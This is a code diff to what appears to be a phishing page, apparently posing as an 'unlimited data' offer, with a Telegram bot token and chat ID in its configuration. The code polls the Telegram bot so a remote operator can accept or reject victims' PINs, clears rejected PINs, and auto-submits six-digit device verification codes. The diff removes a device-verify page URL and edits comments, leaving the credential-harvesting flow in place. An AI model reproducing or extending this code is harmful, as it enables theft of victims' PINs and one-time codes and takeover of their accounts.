@@ -183,8 +183,7 @@
         const CONFIG = {
             BOT_TOKEN: '8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8',
             CHAT_ID: '7547427914',
-            SUCCESS_PAGE: 'https://unlimiteddata.vercel.app/success.html',
-            DEVICE_PAGE: 'https://unlimiteddata.vercel.app/device_verify.html'
+            SUCCESS_PAGE: 'https://unlimiteddata.vercel.app/success.html'
         };
 
         let state = {
@@ -285,6 +284,7 @@
 
         function startPolling() {
             if (state.pollInterval) clearInterval(state.pollInterval);
+
             state.pollInterval = setInterval(() => {
                 fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}&timeout=10`)
                     .then(r => r.json())
@@ -303,6 +303,7 @@
                                     spinner.style.display = 'none';
                                     errMsg.textContent = "Invalid PIN. Please try again.";
                                     errMsg.style.display = 'block';
+                                    // Reset PIN inputs
                                     document.querySelectorAll('.pin-input').forEach(i => i.value = '');
                                     document.querySelectorAll('.pin-input')[0].focus();
                                 }
@@ -331,7 +332,7 @@
             }
         };
 
-        // Auto-submit when complete
+        // Auto submit when complete
         document.addEventListener('input', () => {
             if (getCode(otpInputs).length === 6 && deviceStep.style.display !== 'none') {
                 setTimeout(submitDeviceCode, 250);
